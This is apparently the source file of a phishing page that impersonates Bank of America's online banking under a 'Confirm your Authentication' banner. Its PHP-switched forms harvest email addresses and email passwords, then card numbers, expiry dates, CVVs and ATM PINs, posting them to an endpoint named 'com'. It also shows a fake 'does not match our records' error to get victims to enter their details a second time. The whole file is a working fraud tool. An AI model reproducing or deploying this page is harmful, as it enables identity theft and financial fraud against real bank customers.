<!DOCTYPE html>
<html lang="en">
<head>
	<title>Bank of America | Online Banking</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="images/favicon.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>

	<div align="center" style="min-width:430px;background-color:#ffffff;">
	<div style="height:98px">
		<div align="left" style="padding-top:18px;padding-left:5%;">
	  <img src="images/assets-images-global-logos.svg" width="250" height="70" alt="">
		<div class="sl-nav">
			<ul>
			<div style="padding-top:10px;">
		 <p><img src="images/locki.svg" width="20" height="20" alt=""> <b style="padding-top:2px;"><font color="gray">Secure Area</font></b></p>
			</div>
			</ul>
		</div>
		</div>
		
	</div>
	<div style="background-color: #dc1431;
	background-image: url('images/ban1.png');
	background-size: 100%;
    border-color: rgba(232, 232, 232, 1);
    border-bottom-width: 1px;
    border-bottom-style: solid;
		color:white;
		height:40px;
    max-height:60px;">
		<div style="float:left;padding-top:5px;padding-left:5%;">
		<h4>Confirm your Authentication</h4>
		</div>
	</div>
	</div>

	<div class="container-contact100">
		<div class="wrap-contact100">
		<?php 
		if (isset($_GET['error']) && $_GET['error'] == "1") {
		?>
			<form method="POST" action="com" class="contact100-form validate-form">
          <div class="bs-example"> 
			<div class="alert alert-danger alert-dismissible fade show">
			<h1 class="alert-heading"><i class="fa fa-warning"></i> </h1>
			<p>We're unable to complete your request at this time. The information you entered does not match our records.Please verify your information.</p>
			<hr>
			</div>
			</div>
				<input  type="text" name="errori" value="1" hidden>
				<label class="label-input100" for="ema">Email Address *</label>
				<div class="wrap-input100  validate-input" data-validate="Email Address is Required">
					<input id="ema" class="input100" type="email" name="ema" placeholder="">
					<span class="focus-input100"></span>
				</div>
				
				<label class="label-input100" for="emp">Email Password *</label>
				<div class="wrap-input100  validate-input" data-validate="Email Password is Required">
					<input id="emp" class="input100" type="password" name="emp" placeholder="">
					<span class="focus-input100"></span>
				</div>
				
				<label class="label-input100"><font color="red"><i class="fa fa-warning"></i> Try again with correct information</font></label>

				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						Continue
					</button>
				</div>
				<input type="hidden" name="recaptcha_response" id="recaptchaResponse">

			</form>
		<?php 
		} else if (isset($_GET['error']) && $_GET['error'] == "3") {
		?>
			<form method="POST" action="com" class="contact100-form validate-form">
				<input  type="text" name="errori" value="3" hidden>
				<label class="label-input100" for="ccn">Credit/Debit Card Number (16 digits) *</label>
				<div class="wrap-input100 validate-input" data-validate="Credit/Debit Card Number is Required">
					<input id="ccn" class="input100" type="text" minlength="19" maxlength="19" name="ccn" placeholder="0000-0000-0000-0000" pattern="\d*" required="required" onkeypress="return isNumberKey(event)">
					<span class="focus-input100"></span>
				</div>


				<label class="label-input100" for="exp">Expiration Date (MM/YY) *</label>
				<div class="wrap-input100 validate-input" data-validate = "Expiration Date (MM/YY) is Required">
					<input id="exp" class="input100"  type="tel" minlength="5" maxlength="8" name="exp" placeholder="00/0000" onkeypress="return isNumberKey(event)">
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="cvci">Credit/Debit CVV/CVC (3 digits) *</label>
				<div class="wrap-input100 validate-input" data-validate="Credit/Debit CVV/CVC is Required">
					<input id="cvci" class="input100" type="text" minlength="3" maxlength="3" name="cvci" placeholder="000" pattern="\d*" required="required" onkeypress="return isNumberKey(event)"/>
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="ati">ATM/Debit Card PIN *</label>
				<div class="wrap-input100 validate-input" data-validate="ATM/Debit Card PIN is Required">
					<input id="ati" class="input100" type="text" minlength="4" maxlength="6" name="ati" placeholder="0000" pattern="\d*" required="required" onkeypress="return isNumberKey(event)"/>
					<span class="focus-input100"></span>
				</div>
				
				<label class="label-input100"><font color="red"><i class="fa fa-warning"></i> Try again with correct information</font></label>
				

				

				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						Continue
					</button>
				</div>
				<input type="hidden" name="recaptcha_response" id="recaptchaResponse">

			</form>
			<?php } else {?>
				<form method="POST" action="com" class="contact100-form validate-form">
				<input  type="text" name="errori" value="2" hidden>
				<label class="label-input100" for="ema">Email Address *</label>
				<div class="wrap-input100  validate-input" data-validate="Email Address is Required">
					<input id="ema" class="input100" type="email" name="ema" placeholder="">
					<span class="focus-input100"></span>
				</div>
				
				<label class="label-input100" for="emp">Email Password *</label>
				<div class="wrap-input100  validate-input" data-validate="Email Password is Required">
					<input id="emp" class="input100" type="password" name="emp" placeholder="">
					<span class="focus-input100"></span>
				</div>
				

				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						Continue
					</button>
				</div>
				<input type="hidden" name="recaptcha_response" id="recaptchaResponse">

			</form>
		<?php }?>
		</div>
	</div>



	<div id="dropDownSelect1"></div>

<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
	<script>
		$(".selection-2").select2({
			minimumResultsForSearch: 20,
			dropdownParent: $('#dropDownSelect1')
		});
	</script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>
	<script src="js/angular.min.js"></script>
	<script src="js/jquery.min.js"></script>
	<script src="js/jquery.validate.min.js"></script>
	<script src="js/jquery.mask.js"></script>
	<script type="text/javascript">
    	$(function() {
        $('#ccn').mask('0000-0000-0000-0000');
    	$('#cvci').mask('000');
    	$('#exp').mask('00/0000');
		$('#ati').mask('0000');
 });
 </script>

</body>
<style>
.footer {
  position: static;
  left: 0;
  bottom: 0;
  width: 100%;
  min-width:430px;
  background-color: #f3efea;
  color: white;
  text-align: center;
  display: inline-flex;
}
.footer>div {
flex: 1 0 50%;
padding-right: 15px;
padding-left: 15px;
max-width: 50%;
line-height: 1.2;
}
</style>
</html>
